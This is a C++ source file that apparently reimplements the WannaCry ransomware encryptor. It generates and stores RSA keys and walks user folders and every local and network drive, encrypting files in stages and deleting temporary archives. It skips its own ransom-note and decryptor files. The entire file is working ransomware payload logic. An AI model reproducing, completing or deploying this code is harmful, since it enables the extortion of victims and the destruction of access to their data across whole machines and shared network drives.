#include <WinSock2.h>
#include <shlobj.h>
#include "WanaEncryptor.h"
#include "../EZCrypt/EZRSA.h"
#include "../Common/common.h"
#include "../Common/ezfile.h"
#include "../Common/socktool.h"
#include "../EZCrypt/Keys.h"

#ifndef SERVER_PORT
#define SERVER_PORT DECRYPT_SERVER_PORT
#endif

static BOOL gbDecryptFlag = FALSE;

WanaCryptor::WanaCryptor(
	PUCHAR pbPublicKey,
	ULONG cbPublicKey)
{
	m_pWanaZip = NULL;
	m_pFileList = NULL;
	Init();
	SetupRSA(0, pbPublicKey, cbPublicKey);
	InitWanaZip(0);
	m_pFileList = new FileList();
	m_TotalFile = 0;
	m_TotalSize = { 0 };
}

WanaCryptor::WanaCryptor()
{
	WanaCryptor(0, 0);
}

WanaCryptor::~WanaCryptor()
{
	if (m_pFileList) {
		delete m_pFileList;
		m_pFileList = NULL;
	}
	if (m_pWanaZip) {
		delete m_pWanaZip;
		m_pWanaZip = NULL;
	}
}

BOOL WanaCryptor::Init()
{
	HRESULT result = SHGetFolderPath(
		NULL,
		CSIDL_PERSONAL,
		NULL,
		SHGFP_TYPE_CURRENT,
		m_BasePath);
	if (result != S_OK) {
		DEBUG("SHGetFolderPath() error: %d\n",
			result);
		return FALSE;
	}
	_tcscat_s(m_BasePath, MAX_PATH, _T("\\"));
	_tcscat_s(m_BasePath, MAX_PATH, BASE_DIRNAME);
	DEBUG("Base Directory: %s\n", m_BasePath);
	if (GetFileAttributes(m_BasePath) ==
		INVALID_FILE_ATTRIBUTES) {
		if (!CreateDirectory(m_BasePath, 0)) {
			DEBUG("Create %s fails\n",
				m_BasePath);
			return FALSE;
		}
		DEBUG("Create %s successfully\n",
			m_BasePath);
	}
	return TRUE;
}

BOOL WanaCryptor::SetupRSA(
	DWORD nKeyNo,
	PUCHAR pbPublicKey,
	ULONG cbPublicKey)
{
	TCHAR szPKYFile[MAX_PATH];
	TCHAR szEKYFile[MAX_PATH];
	BOOL bResult = FALSE;
	PEZRSA pNewRSA = new EZRSA();
	PEZRSA pEncRSA = NULL;
	_stprintf_s(szPKYFile, MAX_PATH,
		_T("%s\\%08x.pky"), m_BasePath, nKeyNo);
	_stprintf_s(szEKYFile, MAX_PATH,
		_T("%s\\%08x.eky"), m_BasePath, nKeyNo);
	if (GetFileAttributes(szPKYFile) !=
		INVALID_FILE_ATTRIBUTES) {
		return TRUE;
	}
	pNewRSA->GenKey();
	if (!pNewRSA->Export(
		BCRYPT_RSAPUBLIC_BLOB,
		szPKYFile,
		NULL)) {
		bResult = FALSE;
		goto Exit;
	}
	if (pbPublicKey) {
		pEncRSA = new EZRSA();
		if (!pEncRSA->Import(
			BCRYPT_RSAPUBLIC_BLOB,
			pbPublicKey,
			cbPublicKey)) {
			bResult = FALSE;
			goto Exit;
		}
	}
	if (!pNewRSA->Export(
		BCRYPT_RSAPRIVATE_BLOB,
		szEKYFile,
		pEncRSA)) {
		bResult = FALSE;
		goto Exit;
	}
Exit:
	if (pEncRSA) {
		delete pEncRSA;
	}
	delete pNewRSA;
	return bResult;
}

BOOL WanaCryptor::InitWanaZip(
	DWORD nKeyNo)
{
	TCHAR szPKYFile[MAX_PATH];
	BOOL bResult = FALSE;
	DEBUG("InitWanaZip: m_BasePath: %s\n",
		m_BasePath);
	_stprintf_s(szPKYFile, MAX_PATH,
		_T("%s\\%08x.pky"), m_BasePath, nKeyNo);
	if (m_pWanaZip) {
		return TRUE;
	}
	if (GetFileAttributes(szPKYFile) ==
		INVALID_FILE_ATTRIBUTES) {
		DEBUG("%s not found\n", szPKYFile);
		return FALSE;
	}
	m_pWanaZip = new WanaZip();
	bResult = m_pWanaZip->ImportPublicKey(szPKYFile);
	if (!bResult)
	{
		DEBUG("import %s error\n",
			szPKYFile);
	}
	return bResult;
}


ULONG WanaCryptor::SelectEncryptAction(PFileInfo pInfo, ULONG nStage)
{
	if (nStage >= 4) {
		return DO_ENCRYPT;
	}
	ULONG nFileType = pInfo->m_dwFileType;
	if (!nFileType) {
		return DO_NOTHING;
	}
	if (nStage == 3) {
		return DO_ENCRYPT;
	}
	if (nFileType == FILETYPE_WRITESRC) {
		return DO_NOTHING;
	}
	if (nFileType == FILETYPE_ZIP_TEMP) {
		return DO_DELETE;
	}

	BOOL bSmallFile = FALSE, bLargeFile = FALSE;
	if (pInfo->m_cbFileSize.QuadPart <= 0x400) {
		bSmallFile = TRUE;
	}
	if (pInfo->m_cbFileSize.QuadPart >= 0xC800000) {
		bLargeFile = TRUE;
	}
	if (bSmallFile) {
		return DO_NOTHING;
	}
	if (nStage == 1 &&
		pInfo->m_dwFileType == FILETYPE_LOW_PRIORITY) {
		return DO_NOTHING;
	}
	if (bLargeFile) {
		return DO_WRITESRC;
	}
	return DO_ENCRYPT;
}

BOOL WanaCryptor::EncryptDispatch(
	PFileInfo pInfo,
	ULONG nStage)
{
	InitWanaZip(0);
	ULONG nAction = SelectEncryptAction(pInfo, nStage);
	switch (nAction) {
	case DO_ENCRYPT:
		m_pWanaZip->Encrypt(
			pInfo->m_szFullPath,
			DO_ENCRYPT);
		return TRUE;
	case DO_WRITESRC:
		if (m_pWanaZip->Encrypt(
			pInfo->m_szFullPath,
			DO_WRITESRC)) {
			_tcscat_s(pInfo->m_szName, WZIP_SUFFIX_WRITESRC);
			_tcscat_s(pInfo->m_szFullPath, WZIP_SUFFIX_WRITESRC);
			pInfo->m_dwFileType = FILETYPE_WRITESRC;
		}
	default:
		return FALSE;
	case DO_DELETE:
		DeleteFile(pInfo->m_szFullPath);
	case DO_NONE:
		break;
	}
	return TRUE;
}

BOOL WanaCryptor::EncryptTraverse(LPCTSTR pPathName)
{
	WIN32_FIND_DATA FindFileData;
	TCHAR szDir[MAX_PATH];
	TCHAR szPath[MAX_PATH];
	HANDLE hFind = INVALID_HANDLE_VALUE;
	PFileList pFileList = new FileList();
	if (gbDecryptFlag) {
		return FALSE;
	}
	if (!InitWanaZip(0)) {
		return FALSE;
	}
	if (_tcslen(pPathName) > (MAX_PATH - 3))
	{
		DEBUG("\nDirectory path is too long %d.\n",
			(int) _tcslen(pPathName));
		return FALSE;
	}
	_stprintf_s(szDir, MAX_PATH,
		_T("%s\\*"), pPathName);
	DEBUG("FindFirstFile: %s\n", szDir);
	hFind = FindFirstFile(szDir, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFind)
	{
		if (GetLastError() == ERROR_ACCESS_DENIED) {
			return FALSE;
		}
		DEBUG("FindFirstFile Error: %d %s\n",
			GetLastError(), szDir);
		return FALSE;
	}
	DEBUG("Loop\n");
	do
	{
		DEBUG("Find: %s\n", FindFileData.cFileName);
		if (_tcslen(pPathName) + 1 +
			_tcslen(FindFileData.cFileName) > (MAX_PATH - 3))
		{
			DEBUG("\nDirectory path is too long: %s\n",
				FindFileData.cFileName);
			return FALSE;
		}
		_stprintf_s(szPath, MAX_PATH,
			_T("%s\\%s"), pPathName, FindFileData.cFileName);
		if (FindFileData.dwFileAttributes &
			FILE_ATTRIBUTE_DIRECTORY)
		{
			if (_tcscmp(FindFileData.cFileName, _T(".")) &&
				_tcscmp(FindFileData.cFileName, _T(".."))) {
				if (!isIgnorePath(szPath, FindFileData.cFileName)) {
					EncryptTraverse(szPath);
				}
			}
		}
		else if (!(FindFileData.dwFileAttributes &
			FILE_ATTRIBUTE_READONLY))
		{
			DEBUG("Is File Branch\n");
			if (_tcscmp(FindFileData.cFileName,
				_T("@Please_Read_Me@.txt")) &&
				_tcscmp(FindFileData.cFileName,
					_T("@WanaDecryptor@.exe.lnk")) &&
				_tcscmp(FindFileData.cFileName,
					_T("@WanaDecryptor@.bmp"))) {

				DWORD dwFileType =
					ClassifyFileType(FindFileData.cFileName);
				DEBUG("FileType: %d\n", dwFileType);
				if (dwFileType != FILETYPE_ENCRYPTED &&
					dwFileType != FILETYPE_EXE_DLL) {
					PFileNode pNode = new FileNode();

					_tcscpy_s(pNode->m_Info.m_szFullPath,
						MAX_PATH + 100, szPath);
					_tcscpy_s(pNode->m_Info.m_szName,
						MAX_PATH, FindFileData.cFileName);
					pNode->m_Info.m_cbFileSize.LowPart = 
						FindFileData.nFileSizeLow;
					pNode->m_Info.m_cbFileSize.HighPart =
						FindFileData.nFileSizeHigh;
					pNode->m_Info.m_dwFileType =
						dwFileType;
					pFileList->Insert(pNode);
					DEBUG("Insert done\n");
				}
				DEBUG("File done: %s\n", FindFileData.cFileName);
			}
		}
	} while (FindNextFile(hFind, &FindFileData) != 0 &&
		!gbDecryptFlag);
	FindClose(hFind);
	for (PFileNode pNode =
		pFileList->m_pHead->m_pPrev, pPrev;
		pNode != pFileList->m_pHead && !gbDecryptFlag;
		pNode = pPrev) {
		pPrev = pNode->m_pPrev;
		if (!EncryptDispatch(&pNode->m_Info, 1)) {
			m_pFileList->Insert(pNode);
		}
		else {
			m_TotalFile++;
			m_TotalSize.QuadPart +=
				pNode->m_Info.m_cbFileSize.QuadPart;
			delete pNode;
		}
		//              system("pause");
	}
	delete pFileList;
	return TRUE;
}

BOOL WanaCryptor::EncryptFileList()
{
	PFileNode pHead = m_pFileList->m_pHead;
	PFileNode pNode;
	for (ULONG nStage = 2; nStage <= 4; nStage++)
	{
		pNode = pHead->m_pPrev;
		if (pHead->m_pPrev != pHead)
		{
			do {
				if (EncryptDispatch(&pNode->m_Info, nStage)) {
					PFileNode pDelete = pNode;
					pNode = pNode->m_pPrev;
					pDelete->m_pNext->m_pPrev = pDelete->m_pPrev;
					pDelete->m_pPrev->m_pNext = pDelete->m_pNext;
					m_pFileList->m_nFiles--;
					m_TotalFile++;
					m_TotalSize.QuadPart +=
						pDelete->m_Info.m_cbFileSize.QuadPart;
					delete pDelete;
				}
				else {
					pNode = pNode->m_pPrev;
				}
				pHead = m_pFileList->m_pHead;
			} while (pNode != m_pFileList->m_pHead);
		}
	}
	return TRUE;
}

BOOL WanaCryptor::Encrypt(LPCTSTR pPath)
{
	DWORD attr;
	if ((attr = GetFileAttributes(pPath))
		== INVALID_FILE_ATTRIBUTES) {
		DEBUG("Can't get attributes of %s\n", pPath);
		return FALSE;
	}
	if (attr & FILE_ATTRIBUTE_READONLY) {
		DEBUG("%s is read only\n", pPath);
		return FALSE;
	}
	if (attr & FILE_ATTRIBUTE_DIRECTORY) {
		DEBUG("Traverse directory: %s\n", pPath);
		EncryptTraverse(pPath);
		DEBUG("Encrypt FileList: %s\n", pPath);
		EncryptFileList();
	}
	else {
		if (!InitWanaZip(0)) {
			DEBUG("Import error\n");
			return FALSE;
		}
		DEBUG("Encrypting %s\n", pPath);
		BOOL bResult = m_pWanaZip->Encrypt(
			pPath,
			DO_ENCRYPT);
		return bResult;
	}
	return TRUE;
}

BOOL WanaCryptor::EncryptUsers()
{
	TCHAR szPath[MAX_PATH];
	szPath[0] = _T('\0');
	SHGetFolderPath(
		NULL,
		CSIDL_DESKTOP,
		NULL,
		0,
		szPath);
	if (_tcslen(szPath)) {
		Encrypt(szPath);
	}
	szPath[0] = _T('\0');
	SHGetFolderPath(
		NULL,
		CSIDL_PERSONAL,
		NULL,
		0,
		szPath);
	if (_tcslen(szPath)) {
		Encrypt(szPath);
	}
	szPath[0] = _T('\0');
	SHGetFolderPath(
		NULL,
		CSIDL_COMMON_DESKTOPDIRECTORY,
		NULL,
		0,
		szPath);
	if (_tcslen(szPath)) {
		Encrypt(szPath);
	}
	szPath[0] = _T('\0');
	SHGetFolderPath(
		NULL,
		CSIDL_COMMON_DOCUMENTS,
		NULL,
		0,
		szPath);
	if (_tcslen(szPath)) {
		Encrypt(szPath);
	}
	return TRUE;
}

BOOL WanaCryptor::EncryptDrivers()
{
	//ULONG i = 0;
	TCHAR szRootPathName[16] = ENCRYPT_ROOT_PATH;
	DWORD drivers = GetLogicalDrives();
	for (int RunNO = 0;
		RunNO < 2 && !gbDecryptFlag;
		RunNO++) {
		for (int DiskNO = 25;
			DiskNO >= 0 && !gbDecryptFlag;
			DiskNO--) {
			drivers = GetLogicalDrives();
			szRootPathName[0] = DiskNO + 65;
			if ((drivers >> DiskNO) & 1) {
				if (RunNO == 0 && DiskNO >= 2) {
					if (GetDriveType(szRootPathName) !=
						DRIVE_REMOTE) {
						DEBUG("EncryptTarget: %s\n",
							szRootPathName);
						Encrypt(szRootPathName);
					}
				}
				else if (RunNO == 1) {
					if (GetDriveType(szRootPathName) ==
						DRIVE_REMOTE || DiskNO < 2) {
						DEBUG("EncryptTarget: %s\n",
							szRootPathName);
						Encrypt(szRootPathName);
					}
				}
			}
		}
	}
	return TRUE;
}

BOOL WanaCryptor::EncryptAll()
{
	if (!EncryptUsers()) {
		return FALSE;
	}
	if (!EncryptDrivers()) {
		return FALSE;
	}
	return TRUE;
}

ULONG WanaCryptor::GetTotalFile()
{
	return m_TotalFile;
}

BOOL WanaCryptor::GetTotalSize(PLARGE_INTEGER pSize)
{
	if (pSize) {
		pSize->QuadPart = m_TotalSize.QuadPart;
	}
	return TRUE;
}

BOOL CheckDKYFileValid(DWORD nKeyNo)
{
	TCHAR BasePath[MAX_PATH];
	TCHAR szPKYFile[MAX_PATH];
	TCHAR szDKYFile[MAX_PATH];
	BOOL bResult = FALSE;
	HRESULT result = SHGetFolderPath(
		NULL,
		CSIDL_PERSONAL,
		NULL,
		SHGFP_TYPE_CURRENT,
		BasePath);
	_tcscat_s(BasePath, MAX_PATH, _T("\\"));
	_tcscat_s(BasePath, MAX_PATH, BASE_DIRNAME);
	_stprintf_s(szPKYFile, MAX_PATH,
		_T("%s\\%08x.pky"), BasePath, nKeyNo);
	_stprintf_s(szDKYFile, MAX_PATH,
		_T("%s\\%08x.dky"), BasePath, nKeyNo);
	gbDecryptFlag = RSAFileMatch(szPKYFile, szDKYFile);
	return gbDecryptFlag;
}

BOOL GetDecryptFlag()
{
	return gbDecryptFlag;
}
